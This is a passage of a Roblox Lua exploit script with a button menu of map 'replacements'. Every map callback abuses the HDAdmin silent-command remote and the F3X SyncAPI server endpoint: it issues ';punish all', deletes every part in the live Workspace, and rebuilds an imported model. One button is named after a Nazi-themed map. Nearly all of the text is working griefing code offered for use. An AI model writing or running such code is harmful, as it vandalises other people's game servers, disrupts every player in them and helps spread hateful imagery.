-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(23, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Work At A Pizza Place",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn("You don't have F3X skid")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "5951103036" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(9, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Fencing",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn("You don't have F3X skid")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "120010663107698" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(4, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
	end)
end)

 end
})
MapsAddButton({
    Name = "Meepcity 4",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
print(" Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "16423000248" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

print(" Finished rebuilding model:", model_id)

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(5, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
		wait(0.2)
		RequestCommand:InvokeServer(";r6 all")
	end)
end)

 end
})
MapsAddButton({
    Name = "'N*Zi map",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn(" You don't have F3X equipped or in your backpack.")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================
print(" Deleting all workspace parts...")

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)
print(" Workspace cleared. Starting rebuild...")

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "111491615876846" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

print(" Finished rebuilding model:", model_id)

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(5, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
	end)
end)


 end
})
MapsAddButton({
    Name = "'Fencing 2",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- ===============================
-- Initial HDAdmin Commands (top)
-- ===============================
pcall(function()
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	RequestCommand:InvokeServer(";btools me")
	wait(0.4)
	RequestCommand:InvokeServer(";punish all")
end)

-- ===============================
-- F3X (SyncAPI) Detection
-- ===============================
local function getF3X()
	for _, v in ipairs(player.Backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getF3X()
if not f3x then
	warn("You don't have F3X skid")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

-- Helper: safe invoke
local function fastInvoke(args)
	task.spawn(function()
		pcall(function()
			serverendpoint:InvokeServer(unpack(args))
		end)
	end)
end

-- Helper: delete a part
local function deletePart(part)
	fastInvoke({"Remove", {part}})
end

-- ===============================
-- DELETE ALL PARTS (BEFORE BUILD)
-- ===============================

for _, obj in ipairs(Workspace:GetDescendants()) do
	if obj:IsA("BasePart") or obj:IsA("UnionOperation") or obj:IsA("Model") then
		task.spawn(function()
			pcall(function() deletePart(obj) end)
		end)
	end
end

-- wait a moment to ensure cleanup is complete
task.wait(3)

-- ===============================
-- IMPORT MODEL TO REBUILD
-- ===============================
local model_id = "93738959237570" -- << your model here
local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
if not imported_model then
	warn(" Failed to load model ID: " .. tostring(model_id))
	return
end

imported_model.Parent = Lighting -- stash away

local destination = Workspace
local f3x_name = "Building Tools"

-- auto cleanup imported clone
task.delay(15, function()
	if imported_model then
		imported_model:Destroy()
	end
end)

-- ===============================
-- F3X BUILD FUNCTION
-- ===============================
local function f3xBuildPart(fake_part)
	local sync = player.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint

	local partType =
		fake_part:IsA("WedgePart") and "Wedge"
		or fake_part:IsA("Seat") and "Seat"
		or fake_part:IsA("VehicleSeat") and "VehicleSeat"
		or fake_part:IsA("TrussPart") and "Truss"
		or fake_part:IsA("SpawnLocation") and "Spawn"
		or fake_part.Shape == Enum.PartType.Block and "Normal"
		or fake_part.Shape == Enum.PartType.Ball and "Ball"
		or fake_part.Shape == Enum.PartType.Cylinder and "Cylinder"

	local created = sync:InvokeServer("CreatePart", partType, fake_part.CFrame, destination)

	-- resize
	sync:InvokeServer("SyncResize", {
		{ Part = created, CFrame = created.CFrame, Size = fake_part.Size }
	})

	-- color & transparency
	sync:InvokeServer("SyncColor", {
		{ Part = created, Color = fake_part.Color, UnionColoring = true }
	})
	sync:InvokeServer("SyncMaterial", {
		{ Part = created, Material = fake_part.Material, Transparency = fake_part.Transparency }
	})

	-- collision
	sync:InvokeServer("SyncCollision", {
		{ Part = created, CanCollide = fake_part.CanCollide }
	})

	-- apply textures / decals / meshes
	for _, tex in ipairs(fake_part:GetChildren()) do
		if tex:IsA("Texture") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Texture" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Texture", StudsPerTileU = tex.StudsPerTileU, StudsPerTileV = tex.StudsPerTileV, Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("Decal") then
			sync:InvokeServer("CreateTextures", {
				{ Part = created, Face = tex.Face, TextureType = "Decal" }
			})
			sync:InvokeServer("SyncTexture", {
				{ Part = created, Face = tex.Face, TextureType = "Decal", Texture = tex.Texture, Transparency = tex.Transparency }
			})
		elseif tex:IsA("SpecialMesh") then
			sync:InvokeServer("CreateMeshes", { { Part = created } })
			sync:InvokeServer("SyncMesh", {
				{ Part = created, MeshId = tex.MeshId, TextureId = tex.TextureId, Scale = tex.Scale }
			})
		end
	end
end

-- ===============================
-- BUILD ALL MODEL PARTS
-- ===============================
for _, part in ipairs(imported_model:GetDescendants()) do
	if part:IsA("BasePart") then
		task.spawn(function()
			f3xBuildPart(part)
		end)
	end
end

-- ===============================
-- HDAdmin Cleanup Commands
-- ===============================
task.delay(4, function()
	pcall(function()
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";res all")
	end)
end)


 end
})
MapsAddButton({
    Name = "'Extra Button a",
    Callback = function() 


 end
})
MapsAddButton({
    Name = "'Extra Button a",
    Callback = function() 


 end
})
MapsAddButton({
    Name = "'Extra Button a",
    Callback = function() 


 end
})
MapsAddButton({
    Name = "'Extra Button a",
    Callback = function() 


 end
})
MapsAddButton({
    Name = "Police Car",
    Callback = function() 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";insert 6418230807")


 end
})






-- Load F3X buttons by default
ShowF3XButtons()